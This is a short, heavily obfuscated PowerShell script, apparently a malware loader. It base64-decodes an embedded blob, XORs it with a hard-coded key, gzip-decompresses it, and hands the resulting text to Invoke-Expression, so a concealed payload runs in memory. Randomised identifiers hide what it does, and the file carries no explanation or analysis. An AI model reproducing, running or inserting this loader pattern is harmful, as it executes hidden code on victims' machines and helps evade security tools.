$qkcpibavwjgs39d = [System.Text.Encoding]::ascii
function 5yzgq7lhpkicra0et346fwv89ds  {param($ho6apdgcmej1k5f )
  $rza485dyiwn0q9x = [System.Convert]::FromBase64String($ho6apdgcmej1k5f)
  $ecz954skubwrpvl= $qkcpibavwjgs39d.GetBytes("wr0u7yeg2dlm")
    $y40aihefwknbzjs = $rza485dyiwn0q9x
    $hf93k641sn5lu0x = $(for ($l68y0bc4oj57prk = 0; $l68y0bc4oj57prk -lt $y40aihefwknbzjs.length; ) {
        for ($8nr0cge1u4qz97a = 0; $8nr0cge1u4qz97a -lt $ecz954skubwrpvl.length; $8nr0cge1u4qz97a++) {
            $y40aihefwknbzjs[$l68y0bc4oj57prk] -bxor $ecz954skubwrpvl[$8nr0cge1u4qz97a]
            $l68y0bc4oj57prk++
            if ($l68y0bc4oj57prk -ge $y40aihefwknbzjs.Length) {
                $8nr0cge1u4qz97a = $ecz954skubwrpvl.length
            }
        }
    })
	$jbi5vw1ecpyxs74 = New-Object System.IO.MemoryStream( , $hf93k641sn5lu0x )

	    $h8a3mlw7ifxedgp = New-Object System.IO.MemoryStream
        $b7mpzklgviu3yts = New-Object System.IO.Compression.GzipStream $jbi5vw1ecpyxs74, ([IO.Compression.CompressionMode]::Decompress)
	    $b7mpzklgviu3yts.CopyTo( $h8a3mlw7ifxedgp )
        $b7mpzklgviu3yts.Close()
		$jbi5vw1ecpyxs74.Close()
		[byte[]] $cki81fav0boj5l9 = $h8a3mlw7ifxedgp.ToArray()
 $jemzr0v6c2i597y=$cki81fav0boj5l9
    return $jemzr0v6c2i597y
}
[byte[]]$hzapq4o9ys7ui06=5yzgq7lhpkicra0et346fwv89ds $z9c7lju0a5y2rb1
[System.Text.Encoding]::ascii.GetString((5yzgq7lhpkicra0et346fwv89ds "aPk4dTd5ZWc2ZOE4Gh2TTSeHGS/OY6ePIwBpZV6Q3p0Trb5bDD+HWuaUuwKZ8W9jT3Nz+H47H57dX9DJOuHNJad56qD9WJ+hr9q6f8BBhslWVSvEsLQT405gJ0iY5own/1Kh275c1Cg82fCgzodMz8/90e/4RJp34uWmZwhyGeUctJxcOFe9uTYkLbTTCoBcmU2t6KatAKuOxt7+POjaTVOnvWh0+I4rNtNwFFTdst/6xKNlxIb0vrRgC7NWrjw2I0wih2Zz1Y9Z2wKhECZ4hY9tFLMTTVHfHOVdgXHkhQ3/NacA/MKw+9AqWz18tuMKy3FtdgXonGaDZSS+sMMwfPXa9rso3RpRTk5+sSMfyRSGB1kvzrH2eR6OABe8fgQuxXjF8TyykA4Z1/P60LWUM+rP889HUTO8wc+quECB2rRX3KGafmuTcCcg5miFJfPbd8XmQqyWgqxUvb2p0MmqqaMgiVcc54DnxefMjgLS0gbP3UbWgKeMJPr2E4JILbFi7D1xEBGBTs+YyLiajMf3Jn67NTJszuWgzPBhYHppi+odEAghFbSh22zyZqwGhRW3Nz+UVlwY0u3DBRdQSVj3sgeHemZjh219lXopqA+ad9LEdbSSM11zQhebLJyLDsw/ch+sZS7ZbstjWldOPpAhPEktlNaYID/iNo970ggzGlBW8CcjVQiBQjibMYkHkyDX1wmaV19tqs/zJC05tX+si+r22qsWCfkmNFQRO77M67f2gv5Iz+qufm8Rce96b/pJDsTTpgtEq/9HMNvuTvpbiLaDRoM64+5pRbqIXkW5IGe+6BMl76MteVPVju642TEFKljeD0IDlSoOq3SJfjc2PGRj6KUuhdZODS3Rfb1rJLQm7gQzxeKWkDtHMvLTsoASW2uzdgP31vew3B59CBSyzwVv3DnjmOgHUgIzdeffEfJxDUAJ2f+lmzCC4LEqGLKH99m+1AlNlbz9ZBOEgQqPEG6EHoDBMavTyx7H2azAHhLfm5fQDJ2IAqQQ2oppU6KuyqdLPYgmnpSN+eUenAacC0yXv9CvunkTTL1lUL6eMcMzaS+pnq7YdJpCdEBCTouGfRJshbduVwmzfa6jVRMy/Y2Nf23JPnAxK5l+rf/d3TOXowuc42jvV+HWGku33PXJ1XYFFCs75LcFomObCHA3YkPWRhE3QX5nr2ROYzaVaORMnjHFHbGl7qQsXpWOVpFvqeUlE2h+ZWc="))|iex;